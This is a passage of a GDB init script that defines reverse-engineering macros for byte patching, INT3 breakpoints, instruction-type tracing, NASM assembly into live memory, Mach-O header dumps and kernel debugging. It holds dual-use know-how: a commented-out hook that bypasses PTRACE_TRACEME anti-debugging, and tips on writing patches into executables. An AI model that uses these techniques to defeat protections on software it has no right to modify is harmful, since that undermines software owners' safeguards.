| Patch a single byte at address ADDR1 to NULL (0x00), or a series of bytes between ADDR1 and ADDR2.
end

# FIXME: thumb breakpoint ?
define int3
    if $argc != 1
        help int3
    else
        if $ARM == 1
            set $ORIGINAL_INT3 = *(unsigned int *)$arg0
            set $ORIGINAL_INT3ADDRESS = $arg0
            set *(unsigned int*)$arg0 = 0xe7ffdefe
        else
            # save original bytes and address
            set $ORIGINAL_INT3 = *(unsigned char *)$arg0
            set $ORIGINAL_INT3ADDRESS = $arg0
            # patch
            set *(unsigned char *)$arg0 = 0xCC
        end
    end
end
document int3
Syntax int3 ADDR
| Patch byte at address ADDR to an INT3 (0xCC) instruction or the equivalent software breakpoint for ARM.
end


define rint3
    if $ARM == 1
      	set *(unsigned int *)$ORIGINAL_INT3ADDRESS = $ORIGINAL_INT3
	    set $pc = $ORIGINAL_INT3ADDRESS
    else
    	set *(unsigned char *)$ORIGINAL_INT3ADDRESS = $ORIGINAL_INT3
    	if ($64BITS == 1)
        	set $rip = $ORIGINAL_INT3ADDRESS
    	else
    	    set $eip = $ORIGINAL_INT3ADDRESS
    	end
	end
end
document rint3
Syntax: rint3
| Restore the original byte previous to int3 patch issued with "int3" command.
end

define patch
    if $argc != 3
        help patch
    end
    set $patchaddr = $arg0
    set $patchbytes = $arg1
    set $patchsize = $arg2

    if ($patchsize == 1)
        set *(unsigned char*)$patchaddr = $patchbytes
    end
    if ($patchsize == 2)
        set $lendianbytes = (unsigned short)(($patchbytes << 8) | ($patchbytes >> 8))
        set *(unsigned short*)$patchaddr = $lendianbytes
    end
    if ($patchsize == 4)
        set $lendianbytes = (unsigned int)( (($patchbytes << 8) & 0xFF00FF00 ) | (($patchbytes >> 8) & 0xFF00FF ))
        set $lendianbytes = (unsigned int)($lendianbytes << 0x10 | $lendianbytes >> 0x10)
        set *(unsigned int*)$patchaddr = $lendianbytes
    end
    if ($patchsize == 8)
        set $lendianbytes = (unsigned long long)( (($patchbytes << 8) & 0xFF00FF00FF00FF00ULL ) | (($patchbytes >> 8) & 0x00FF00FF00FF00FFULL ) )
        set $lendianbytes = (unsigned long long)( (($lendianbytes << 0x10) & 0xFFFF0000FFFF0000ULL ) | (($lendianbytes >> 0x10) & 0x0000FFFF0000FFFFULL ) )
        set $lendianbytes = (unsigned long long)( ($lendianbytes << 0x20) | ($lendianbytes >> 0x20) )
        set *(unsigned long long*)$patchaddr = $lendianbytes
    end
end
document patch
Syntax: patch address bytes size
| Patch a given address, converting the bytes to little-endian.
| Assumes input bytes are unsigned values and should be in hexadecimal format (0x...).
| Size must be 1, 2, 4, 8 bytes.
| Main purpose is to be used with the output from the asm commands.
end

# ____________________cflow___________________
define print_insn_type
    if $argc != 1
        help print_insn_type
    else
        if ($arg0 < 0 || $arg0 > 5)
            printf "UNDEFINED/WRONG VALUE"
        end
        if ($arg0 == 0)
            printf "UNKNOWN"
        end
        if ($arg0 == 1)
            printf "JMP"
        end
        if ($arg0 == 2)
            printf "JCC"
        end
        if ($arg0 == 3)
            printf "CALL"
        end
        if ($arg0 == 4)
            printf "RET"
        end
        if ($arg0 == 5)
            printf "INT"
        end
    end
end
document print_insn_type
Syntax: print_insn_type INSN_TYPE_NUMBER
| Print human-readable mnemonic for the instruction type (usually $INSN_TYPE).
end


define get_insn_type
    if $argc != 1
        help get_insn_type
    else
        set $INSN_TYPE = 0
        set $_byte1 = *(unsigned char *)$arg0
        if ($_byte1 == 0x9A || $_byte1 == 0xE8)
            # "call"
            set $INSN_TYPE = 3
        end
        if ($_byte1 >= 0xE9 && $_byte1 <= 0xEB)
            # "jmp"
            set $INSN_TYPE = 1
        end
        if ($_byte1 >= 0x70 && $_byte1 <= 0x7F)
            # "jcc"
            set $INSN_TYPE = 2
        end
        if ($_byte1 >= 0xE0 && $_byte1 <= 0xE3 )
            # "jcc"
            set $INSN_TYPE = 2
        end
        if ($_byte1 == 0xC2 || $_byte1 == 0xC3 || $_byte1 == 0xCA || \
            $_byte1 == 0xCB || $_byte1 == 0xCF)
            # "ret"
            set $INSN_TYPE = 4
        end
        if ($_byte1 >= 0xCC && $_byte1 <= 0xCE)
            # "int"
            set $INSN_TYPE = 5
        end
        if ($_byte1 == 0x0F )
            # two-byte opcode
            set $_byte2 = *(unsigned char *)($arg0 + 1)
            if ($_byte2 >= 0x80 && $_byte2 <= 0x8F)
                # "jcc"
                set $INSN_TYPE = 2
            end
        end
        if ($_byte1 == 0xFF)
            # opcode extension
            set $_byte2 = *(unsigned char *)($arg0 + 1)
            set $_opext = ($_byte2 & 0x38)
            if ($_opext == 0x10 || $_opext == 0x18)
                # "call"
                set $INSN_TYPE = 3
            end
            if ($_opext == 0x20 || $_opext == 0x28)
                # "jmp"
                set $INSN_TYPE = 1
            end
        end
    end
end
document get_insn_type
Syntax: get_insn_type ADDR
| Recognize instruction type at address ADDR.
| Take address ADDR and set the global $INSN_TYPE variable to
| 0, 1, 2, 3, 4, 5 if the instruction at that address is
| unknown, a jump, a conditional jump, a call, a return, or an interrupt.
end


define step_to_call
    set $_saved_ctx = $SHOW_CONTEXT
    set $SHOW_CONTEXT = 0
    set $SHOW_NEST_INSN = 0

    set logging file /dev/null
    set logging redirect on
    set logging on

    set $_cont = 1
    while ($_cont > 0)
        stepi
        get_insn_type $pc
        if ($INSN_TYPE == 3)
            set $_cont = 0
        end
    end

    set logging off

    if ($_saved_ctx > 0)
        context
    end

    set $SHOW_CONTEXT = $_saved_ctx
    set $SHOW_NEST_INSN = 0

    set logging file ~/gdb.txt
    set logging redirect off
    set logging on

    printf "step_to_call command stopped at:\n  "
    x/i $pc
    printf "\n"
    set logging off

end
document step_to_call
Syntax: step_to_call
| Single step until a call instruction is found.
| Stop before the call is taken.
| Log is written into the file ~/gdb.txt.
end


define trace_calls

    printf "Tracing...please wait...\n"

    set $_saved_ctx = $SHOW_CONTEXT
    set $SHOW_CONTEXT = 0
    set $SHOW_NEST_INSN = 0
    set $_nest = 1
    set listsize 0

    set logging overwrite on
    set logging file ~/gdb_trace_calls.txt
    set logging on
    set logging off
    set logging overwrite off

    while ($_nest > 0)
        get_insn_type $pc
        # handle nesting
        if ($INSN_TYPE == 3)
            set $_nest = $_nest + 1
        else
            if ($INSN_TYPE == 4)
                set $_nest = $_nest - 1
            end
        end
        # if a call, print it
        if ($INSN_TYPE == 3)
            set logging file ~/gdb_trace_calls.txt
            set logging redirect off
            set logging on

            set $x = $_nest - 2
            while ($x > 0)
                printf "\t"
                set $x = $x - 1
            end
            x/i $pc
        end

        set logging off
        set logging file /dev/null
        set logging redirect on
        set logging on
        stepi
        set logging redirect off
        set logging off
    end

    set $SHOW_CONTEXT = $_saved_ctx
    set $SHOW_NEST_INSN = 0

    printf "Done, check ~/gdb_trace_calls.txt\n"
end
document trace_calls
Syntax: trace_calls
| Create a runtime trace of the calls made by target.
| Log overwrites(!) the file ~/gdb_trace_calls.txt.
end


define trace_run

    printf "Tracing...please wait...\n"

    set $_saved_ctx = $SHOW_CONTEXT
    set $SHOW_CONTEXT = 0
    set $SHOW_NEST_INSN = 1
    set logging overwrite on
    set logging file ~/gdb_trace_run.txt
    set logging redirect on
    set logging on
    set $_nest = 1

    while ( $_nest > 0 )

        get_insn_type $pc
        # jmp, jcc, or cll
        if ($INSN_TYPE == 3)
            set $_nest = $_nest + 1
        else
            # ret
            if ($INSN_TYPE == 4)
                set $_nest = $_nest - 1
            end
        end
        stepi
    end

    printf "\n"

    set $SHOW_CONTEXT = $_saved_ctx
    set $SHOW_NEST_INSN = 0
    set logging redirect off
    set logging off

    # clean up trace file
    shell  grep -v ' at ' ~/gdb_trace_run.txt > ~/gdb_trace_run.1
    shell  grep -v ' in ' ~/gdb_trace_run.1 > ~/gdb_trace_run.txt
    shell  rm -f ~/gdb_trace_run.1
    printf "Done, check ~/gdb_trace_run.txt\n"
end
document trace_run
Syntax: trace_run
| Create a runtime trace of target.
| Log overwrites(!) the file ~/gdb_trace_run.txt.
end

define entry_point

	set logging redirect on
	set logging file /tmp/gdb-entry_point
	set logging on

	info files

	set logging off

	shell entry_point="$(/usr/bin/grep 'Entry point:' /tmp/gdb-entry_point | /usr/bin/awk '{ print $3 }')"; echo "$entry_point"; echo 'set $entry_point_address = '"$entry_point" > /tmp/gdb-entry_point
	source /tmp/gdb-entry_point
    shell /bin/rm -f /tmp/gdb-entry_point
end
document entry_point
Syntax: entry_point
| Prints the entry point address of the target and stores it in the variable entry_point.
end

define break_entrypoint
	entry_point
	break *$entry_point_address
end
document break_entrypoint
Syntax: break_entrypoint
| Sets a breakpoint on the entry point of the target.
end

define objc_symbols

	set logging redirect on
	set logging file /tmp/gdb-objc_symbols
	set logging on

	info target

	set logging off
    # XXX: define paths for objc-symbols and SymTabCreator
	shell target="$(/usr/bin/head -1 /tmp/gdb-objc_symbols | /usr/bin/head -1 | /usr/bin/awk -F '"' '{ print $2 }')"; objc-symbols "$target" | SymTabCreator -o /tmp/gdb-symtab

	set logging on
	add-symbol-file /tmp/gdb-symtab
	set logging off
    shell /bin/rm -f /tmp/gdb-objc_symbols
end
document objc_symbols
Syntax: objc_symbols
| Loads stripped objc symbols into gdb using objc-symbols and SymTabCreator
| See http://stackoverflow.com/questions/17554070/import-class-dump-info-into-gdb
| and https://github.com/0xced/class-dump/tree/objc-symbols (for the required utils)
end

#define ptraceme
#    catch syscall ptrace
#    commands
#        if ($64BITS == 0)
#            if ($ebx == 0)
#	        set $eax = 0
#                continue
#            end
#        else
#            if ($rdi == 0)
#                set $rax = 0
#                continue
#            end
#        end
#    end
#    set $ptrace_bpnum = $bpnum
#end
#document ptraceme
#Syntax: ptraceme
#| Hook ptrace to bypass PTRACE_TRACEME anti debugging technique
#end

define rptraceme
    if ($ptrace_bpnum != 0)
        delete $ptrace_bpnum
        set $ptrace_bpnum = 0
    end
end
document rptraceme
Syntax: rptraceme
| Remove ptrace hook.
end


# ____________________misc____________________
define hook-stop
    if (sizeof(void*) == 8)
        set $64BITS = 1
    else
        set $64BITS = 0
    end

    if ($KDP64BITS != -1)
        if ($KDP64BITS == 0)
            set $64BITS = 0
        else
            set $64BITS = 1
        end
    end

    # Display instructions formats
    if $ARM == 1
        if $ARMOPCODES == 1
            set arm show-opcode-bytes 1
        end
    else
        if $X86FLAVOR == 0
            set disassembly-flavor intel
        else
            set disassembly-flavor att
        end
    end

    # this makes 'context' be called at every BP/step
    if ($SHOW_CONTEXT > 0)
        context
    end
    if ($SHOW_NEST_INSN > 0)
        set $x = $_nest
        while ($x > 0)
            printf "\t"
            set $x = $x - 1
        end
    end
end
document hook-stop
Syntax: hook-stop
| !!! FOR INTERNAL USE ONLY - DO NOT CALL !!!
end


# original by Tavis Ormandy (http://my.opera.com/taviso/blog/index.dml/tag/gdb) (great fix!)
# modified to work with Mac OS X by fG!
# seems nasm shipping with Mac OS X has problems accepting input from stdin or heredoc
# input is read into a variable and sent to a temporary file which nasm can read
define assemble
    # dont enter routine again if user hits enter
    dont-repeat
    if ($argc)
        if (*$arg0 = *$arg0)
        # check if we have a valid address by dereferencing it,
        # if we havnt, this will cause the routine to exit.
        end
        printf "Instructions will be written to %#x.\n", $arg0
    else
        printf "Instructions will be written to stdout.\n"
    end
    printf "Type instructions, one per line."
	color_bold
    printf " Do not forget to use NASM assembler syntax!\n"
    color_reset
    printf "End with a line saying just \"end\".\n"

    if ($argc)
	    if ($64BITS == 1)
		    # argument specified, assemble instructions into memory at address specified.
    		shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
    		echo -e "BITS 64\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/local/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/bin/hexdump -ve '1/1 "set *((unsigned char *) $arg0 + %#2_ax) = %#02x\n"' >/tmp/gdbassemble ; /bin/rm -f /tmp/$GDBASMFILENAME
    		source /tmp/gdbassemble
    		# all done. clean the temporary file
    		shell /bin/rm -f /tmp/gdbassemble
    	else
	    	# argument specified, assemble instructions into memory at address specified.
	    	shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
		    echo -e "BITS 32\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/bin/hexdump -ve '1/1 "set *((unsigned char *) $arg0 + %#2_ax) = %#02x\n"' >/tmp/gdbassemble ; /bin/rm -f /tmp/$GDBASMFILENAME
    		source /tmp/gdbassemble
	    	# all done. clean the temporary file
		    shell /bin/rm -f /tmp/gdbassemble
    	end
    else
	    if ($64BITS == 1)
		    # no argument, assemble instructions to stdout
    		shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
	    	echo -e "BITS 64\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/local/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/local/bin/ndisasm -i -b64 /dev/stdin ; \
		    /bin/rm -f /tmp/$GDBASMFILENAME
    	else
	    	# no argument, assemble instructions to stdout
	    	shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
	    	echo -e "BITS 32\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/bin/ndisasm -i -b32 /dev/stdin ; \
		    /bin/rm -f /tmp/$GDBASMFILENAME
    	end
    end
end
document assemble
Syntax: assemble <ADDR>
| Assemble instructions using nasm.
| Type a line containing "end" to indicate the end.
| If an address is specified, insert/modify instructions at that address.
| If no address is specified, assembled instructions are printed to stdout.
| Use the pseudo instruction "org ADDR" to set the base address.
end

define assemble32
    # dont enter routine again if user hits enter
    dont-repeat
    if ($argc)
        if (*$arg0 = *$arg0)
        # check if we have a valid address by dereferencing it,
        # if we havnt, this will cause the routine to exit.
        end
        printf "Instructions will be written to %#x.\n", $arg0
    else
        printf "Instructions will be written to stdout.\n"
    end
    printf "Type instructions, one per line."
    color_bold
    printf " Do not forget to use NASM assembler syntax!\n"
    color_reset
    printf "End with a line saying just \"end\".\n"

    if ($argc)
        # argument specified, assemble instructions into memory at address specified.
        shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
        echo -e "BITS 32\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/bin/hexdump -ve '1/1 "set *((unsigned char *) $arg0 + %#2_ax) = %#02x\n"' >/tmp/gdbassemble ; /bin/rm -f /tmp/$GDBASMFILENAME
        source /tmp/gdbassemble
        # all done. clean the temporary file
        shell /bin/rm -f /tmp/gdbassemble
    else
        # no argument, assemble instructions to stdout
        shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
        echo -e "BITS 32\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/bin/ndisasm -i -b32 /dev/stdin ; \
        /bin/rm -f /tmp/$GDBASMFILENAME
    end
end
document assemble32
Syntax: assemble32 <ADDR>
| Assemble 32 bits instructions using nasm.
| Type a line containing "end" to indicate the end.
| If an address is specified, insert/modify instructions at that address.
| If no address is specified, assembled instructions are printed to stdout.
| Use the pseudo instruction "org ADDR" to set the base address.
end

define assemble64
    # dont enter routine again if user hits enter
    dont-repeat
    if ($argc)
        if (*$arg0 = *$arg0)
        # check if we have a valid address by dereferencing it,
        # if we havnt, this will cause the routine to exit.
        end
        printf "Instructions will be written to %#x.\n", $arg0
    else
        printf "Instructions will be written to stdout.\n"
    end
    printf "Type instructions, one per line."
    color_bold
    printf " Do not forget to use NASM assembler syntax!\n"
    color_reset
    printf "End with a line saying just \"end\".\n"

    if ($argc)
        # argument specified, assemble instructions into memory at address specified.
        shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
        echo -e "BITS 64\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/local/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/bin/hexdump -ve '1/1 "set *((unsigned char *) $arg0 + %#2_ax) = %#02x\n"' >/tmp/gdbassemble ; /bin/rm -f /tmp/$GDBASMFILENAME
        source /tmp/gdbassemble
        # all done. clean the temporary file
        shell /bin/rm -f /tmp/gdbassemble
    else
        # no argument, assemble instructions to stdout
        shell ASMOPCODE="$(while read -ep '>' r && test "$r" != end ; do echo -E "$r"; done)" ; GDBASMFILENAME=$RANDOM; \
        echo -e "BITS 64\n$ASMOPCODE" >/tmp/$GDBASMFILENAME ; /usr/local/bin/nasm -f bin -o /dev/stdout /tmp/$GDBASMFILENAME | /usr/local/bin/ndisasm -i -b64 /dev/stdin ; \
        /bin/rm -f /tmp/$GDBASMFILENAME
    end
end
document assemble64
Syntax: assemble64 <ADDR>
| Assemble 64 bits instructions using nasm.
| Type a line containing "end" to indicate the end.
| If an address is specified, insert/modify instructions at that address.
| If no address is specified, assembled instructions are printed to stdout.
| Use the pseudo instruction "org ADDR" to set the base address.
end

define asm
	if $argc == 1
		assemble $arg0
	else
		assemble
	end
end
document asm
Syntax: asm <ADDR>
| Shortcut to the asssemble command.
end

define asm32
    if $argc == 1
        assemble32 $arg0
    else
        assemble32
    end
end
document asm32
Syntax: asm32 <ADDR>
| Shortcut to the assemble32 command.
end

define asm64
    if $argc == 1
        assemble64 $arg0
    else
        assemble64
    end
end
document asm64
Syntax: asm64 <ADDR>
| Shortcut to the assemble64 command.
end

define assemble_gas
    printf "\nType code to assemble and hit Ctrl-D when finished.\n"
    printf "You must use GNU assembler (AT&T) syntax.\n"

    shell filename=$(mktemp); \
          binfilename=$(mktemp); \
          echo -e "Writing into: ${filename}\n"; \
          cat > $filename; echo ""; \
          as -o $binfilename < $filename; \
          objdump -d -j .text $binfilename; \
          rm -f $binfilename; \
          rm -f $filename; \
          echo -e "temporaly files deleted.\n"
end
document assemble_gas
Syntax: assemble_gas
| Assemble instructions to binary opcodes. Uses GNU as and objdump.
end


define dump_hexfile
    dump ihex memory $arg0 $arg1 $arg2
end
document dump_hexfile
Syntax: dump_hexfile FILENAME ADDR1 ADDR2
| Write a range of memory to a file in Intel ihex (hexdump) format.
| The range is specified by ADDR1 and ADDR2 addresses.
end


define dump_binfile
    dump memory $arg0 $arg1 $arg2
end
document dump_binfile
Syntax: dump_binfile FILENAME ADDR1 ADDR2
| Write a range of memory to a binary file.
| The range is specified by ADDR1 and ADDR2 addresses.
end


define dumpmacho
    if $argc != 2
        help dumpmacho
    end
    set $headermagic = *$arg0
    # the || operator isn't working as it should, wtf!!!
    if $headermagic != 0xfeedface
        if $headermagic != 0xfeedfacf
            printf "[Error] Target address doesn't contain a valid Mach-O binary!\n"
            help dumpmacho
        end
    end
    set $headerdumpsize = *($arg0+0x14)
    if $headermagic == 0xfeedface
        dump memory $arg1 $arg0 ($arg0+0x1c+$headerdumpsize)
    end
    if $headermagic == 0xfeedfacf
        dump memory $arg1 $arg0 ($arg0+0x20+$headerdumpsize)
    end
end
document dumpmacho
Syntax: dumpmacho STARTADDRESS FILENAME
| Dump the Mach-O header to a file.
| You need to input the start address (use info shared command to find it).
end


define cls
    shell clear
end
document cls
Syntax: cls
| Clear screen.
end


define search
    set $start = (char *) $arg0
    set $end = (char *) $arg1
    set $pattern = (short) $arg2
    set $p = $start
    while $p < $end
        if (*(short *) $p) == $pattern
            printf "pattern 0x%hx found at 0x%x\n", $pattern, $p
        end
        set $p++
    end
end
document search
Syntax: search <START> <END> <PATTERN>
| Search for the given pattern beetween $start and $end address.
end


# _________________user tips_________________
# The 'tips' command is used to provide tutorial-like info to the user
define tips
    printf "Tip Topic Commands:\n"
    printf "\ttip_display : Automatically display values on each break\n"
    printf "\ttip_patch   : Patching binaries\n"
    printf "\ttip_strip   : Dealing with stripped binaries\n"
    printf "\ttip_syntax  : AT&T vs Intel syntax\n"
end
document tips
Syntax: tips
| Provide a list of tips from users on various topics.
end


define tip_patch
    printf "\n"
    printf "                   PATCHING MEMORY\n"
    printf "Any address can be patched using the 'set' command:\n"
    printf "\t`set ADDR = VALUE` \te.g. `set *0x8049D6E = 0x90`\n"
    printf "\n"
    printf "                 PATCHING BINARY FILES\n"
    printf "Use `set write` in order to patch the target executable\n"
    printf "directly, instead of just patching memory\n"
    printf "\t`set write on` \t`set write off`\n"
    printf "Note that this means any patches to the code or data segments\n"
    printf "will be written to the executable file\n"
    printf "When either of these commands has been issued,\n"
    printf "the file must be reloaded.\n"
    printf "\n"
end
document tip_patch
Syntax: tip_patch
| Tips on patching memory and binary files.
end


define tip_strip
    printf "\n"
    printf "             STOPPING BINARIES AT ENTRY POINT\n"
    printf "Stripped binaries have no symbols, and are therefore tough to\n"
    printf "start automatically. To debug a stripped binary, use\n"
    printf "\tinfo file\n"
    printf "to get the entry point of the file\n"
    printf "The first few lines of output will look like this:\n"
    printf "\tSymbols from '/tmp/a.out'\n"
    printf "\tLocal exec file:\n"
    printf "\t        `/tmp/a.out', file type elf32-i386.\n"
    printf "\t        Entry point: 0x80482e0\n"
    printf "Use this entry point to set an entry point:\n"
    printf "\t`tbreak *0x80482e0`\n"
    printf "The breakpoint will delete itself after the program stops as\n"
    printf "the entry point\n"
    printf "\n"
end
document tip_strip
Syntax: tip_strip
| Tips on dealing with stripped binaries.
end


define tip_syntax
    printf "\n"
    printf "\t    INTEL SYNTAX                        AT&T SYNTAX\n"
    printf "\tmnemonic dest, src, imm            mnemonic src, dest, imm\n"
    printf "\t[base+index*scale+disp]            disp(base, index, scale)\n"
    printf "\tregister:      eax                 register:      %%eax\n"
    printf "\timmediate:     0xFF                immediate:     $0xFF\n"
    printf "\tdereference:   [addr]              dereference:   addr(,1)\n"
    printf "\tabsolute addr: addr                absolute addr: *addr\n"
    printf "\tbyte insn:     mov byte ptr        byte insn:     movb\n"
    printf "\tword insn:     mov word ptr        word insn:     movw\n"
    printf "\tdword insn:    mov dword ptr       dword insn:    movd\n"
    printf "\tfar call:      call far            far call:      lcall\n"
    printf "\tfar jump:      jmp far             far jump:      ljmp\n"
    printf "\n"
    printf "Note that order of operands in reversed, and that AT&T syntax\n"
    printf "requires that all instructions referencing memory operands \n"
    printf "use an operand size suffix (b, w, d, q)\n"
    printf "\n"
end
document tip_syntax
Syntax: tip_syntax
| Summary of Intel and AT&T syntax differences.
end


define tip_display
    printf "\n"
    printf "Any expression can be set to automatically be displayed every time\n"
    printf "the target stops. The commands for this are:\n"
    printf "\t`display expr'     : automatically display expression 'expr'\n"
    printf "\t`display'          : show all displayed expressions\n"
    printf "\t`undisplay num'    : turn off autodisplay for expression # 'num'\n"
    printf "Examples:\n"
    printf "\t`display/x *(int *)$esp`      : print top of stack\n"
    printf "\t`display/x *(int *)($ebp+8)`  : print first parameter\n"
    printf "\t`display (char *)$esi`        : print source string\n"
    printf "\t`display (char *)$edi`        : print destination string\n"
    printf "\n"
end
document tip_display
Syntax: tip_display
| Tips on automatically displaying values when a program stops.
end

# bunch of semi-useless commands

# enable and disable shortcuts for stop-on-solib-events fantastic trick!
define enablesolib
	set stop-on-solib-events 1
	printf "Stop-on-solib-events is enabled!\n"
end
document enablesolib
Syntax: enablesolib
| Shortcut to enable stop-on-solib-events trick.
end


define disablesolib
	set stop-on-solib-events 0
	printf "Stop-on-solib-events is disabled!\n"
end
document disablesolib
Syntax: disablesolib
| Shortcut to disable stop-on-solib-events trick.
end


# enable commands for different displays
define enableobjectivec
	set $SHOWOBJECTIVEC = 1
end
document enableobjectivec
Syntax: enableobjectivec
| Enable display of objective-c information in the context window.
end


define enablecpuregisters
	set $SHOWCPUREGISTERS = 1
end
document enablecpuregisters
Syntax: enablecpuregisters
| Enable display of cpu registers in the context window.
end


define enablestack
	set $SHOWSTACK = 1
end
document enablestack
Syntax: enablestack
| Enable display of stack in the context window.
end


define enabledatawin
	set $SHOWDATAWIN = 1
end
document enabledatawin
Syntax: enabledatawin
| Enable display of data window in the context window.
end


# disable commands for different displays
define disableobjectivec
	set $SHOWOBJECTIVEC = 0
end
document disableobjectivec
Syntax: disableobjectivec
| Disable display of objective-c information in the context window.
end


define disablecpuregisters
	set $SHOWCPUREGISTERS = 0
end
document disablecpuregisters
Syntax: disablecpuregisters
| Disable display of cpu registers in the context window.
end


define disablestack
	set $SHOWSTACK = 0
end
document disablestack
Syntax: disablestack
| Disable display of stack information in the context window.
end


define disabledatawin
	set $SHOWDATAWIN = 0
end
document disabledatawin
Syntax: disabledatawin
| Disable display of data window in the context window.
end


define arm
    if $ARMOPCODES == 1
        set arm show-opcode-bytes 1
    end
    set $ARM = 1
end
document arm
Syntax: arm
| Set gdb to work with ARM binaries.
end

define ioskdp
    set $SHOW_CONTEXT = 0
    set $SHOW_NEST_INSN = 0
end
document ioskdp
Syntax: ioskdp
| Disable dumping context information for iOS KDP debugging
end

define intelsyntax
    if $ARM == 0
        set disassembly-flavor intel
        set $X86FLAVOR = 0
    end
end
document intelsyntax
Syntax: intelsyntax
| Change disassembly syntax to intel flavor.
end


define attsyntax
    if $ARM == 0
        set disassembly-flavor att
        set $X86FLAVOR = 1
    end
end
document attsyntax
Syntax: attsyntax
| Change disassembly syntax to at&t flavor.
end

define kernel32
    if $argc != 0
        # try to load kgmacros files
        # failure is silent if non-existent...
        source $arg0
        set architecture i386
        if $argc == 2
            target remote localhost:$arg1
        else
            target remote localhost:8832
        end
    else
        help kernel32
    end
end
document kernel32
Syntax: kernel32 PATH_TO_KGMACROS <PORT>
| Attach to VMware gdb stub for 32 bits kernel.
| The path to kgmacros must be supplied as first parameter.
| If you don't want to load kgmacros just put something as the first parameter.
| Optional parameter is the port to connect to, in case you are not using the default 8832
| or want to kernel debug more than one active virtual machine.
| By supplying a bogus kgmacros this command should be compatible with any OS.
end

define kernel64
    if $argc != 0
        # try to load kgmacros files
        # failure is silent if non-existent...
        source $arg0
        set architecture i386:x86-64
        if $argc == 2
            target remote localhost:$arg1
        else
            target remote localhost:8864
        end
    else
        help kernel64
    end
end
document kernel64
Syntax: kernel64 PATH_TO_KGMACROS <PORT>
| Attach to VMware gdb stub for 64 bits kernel.
| The path to kgmacros must be supplied as first parameter.
| If you don't want to load kgmacros just put something as the first parameter.
| Optional parameter is the port to connect to, in case you are not using the default 8864
| or want to kernel debug more than one active virtual machine.
| By supplying a bogus kgmacros this command should be compatible with any OS.
end

define 32bits
    set $KDP64BITS = 0
    set $64BITS = 0
end

define 64bits
    set $KDP64BITS = 1
    set $64BITS = 1
end

define resetkdp
    set $KDP64BITS = -1
end

define header
    if $argc != 1
        help header
    else
        dump memory /tmp/gdbinit_header_dump $arg0 $arg0 + 4096
        shell /usr/bin/otool -h /tmp/gdbinit_header_dump
        shell /bin/rm -f /tmp/gdbinit_header_dump
    end
end
document header
Syntax: header MACHO_HEADER_START_ADDRESS
| Dump the Mach-O header located at given address
end

define loadcmds
    if $argc != 1
        help loadcmds
    else
        # this size should be good enough for most binaries
        dump memory /tmp/gdbinit_header_dump $arg0 $arg0 + 4096 * 10
        shell /usr/bin/otool -l /tmp/gdbinit_header_dump
        shell /bin/rm -f /tmp/gdbinit_header_dump
    end
end
document loadcmds
Syntax: loadcmds MACHO_HEADER_START_ADDRESS
| Dump the Mach-O load commands
end

# defining it here doesn't get the space #$#$%"#!
define disablecolorprompt
    set prompt gdb$
end
document disablecolorprompt
| Remove color from prompt
end

define enablecolorprompt
    set prompt \033[31mgdb$ \033[0m
end
document enablecolorprompt
| Enable color prompt
end

#EOF

# Older change logs:
#
#   Version 7.4.4 (02/01/2012)
#     - Added the "skip" command. This will jump to the next instruction after EIP/RIP without executing the current one.
#       Thanks to @bSr43 for the tip to retrieve the current instruction size.
#
#	Version 7.4.3 (04/11/2011)
#	  - Modified "hexdump" command to support a variable number of lines (optional parameter)
#	  - Removed restrictions on type of addresses in the "dd" command - Thanks to Plouj for the warning :-)
#	   I don't know what was the original thinking behind those :-)
#	  - Modified the assemble command to support 64bits - You will need to recompile nasm since the version shipped with OS X doesn't supports 64bits (www.nasm.us).
#	   Assumes that the new binary is installed at /usr/local/bin - modify the variable at the top if you need so.
#	   It will assemble based on the target arch being debugged. If you want to use gdb for a quick asm just use the 32bits or 64bits commands to set your target.
#      Thanks to snare for the warning and original patch :-)
#	  - Added "asm" command - it's a shortcut to the "assemble" command.
#	  - Added configuration variable for colorized prompt. Plouj reported some issues with Ubuntu's gdb 7.2 if prompt is colorized.
#
#   Version 7.4.2 (11/08/2011)
#    Small fix to a weird bug happening on FreeBSD 8.2. It doesn't like a "if(" instruction, needs to be "if (". Weird!
#     Many thanks to Evan for reporting and sending the patch :-)
#    Added the ptraceme/rptraceme commands to bypass PTRACE_TRACME anti-debugging technique.
#     Grabbed this from http://falken.tuxfamily.org/?p=171
#	  It's commented out due to a gdb problem in OS X (refer to http://reverse.put.as/2011/08/20/another-patch-for-apples-gdb-the-definecommands-problem/ )
#	  Just uncomment it if you want to use in ptrace enabled systems.
#
#   Version 7.4.1 (21/06/2011) - fG!
#    Added patch sent by sbz, more than 1 year ago, which I forgot to add :-/
#     This will allow to search for a given pattern between start and end address.
#     On sbz words: "It's usefull to find call, ret or everything like that." :-)
#    New command is "search"
#
#   Version 7.4 (20/06/2011) - fG!
#    When registers change between instructions the color will change to red (like it happens in OllyDBG)
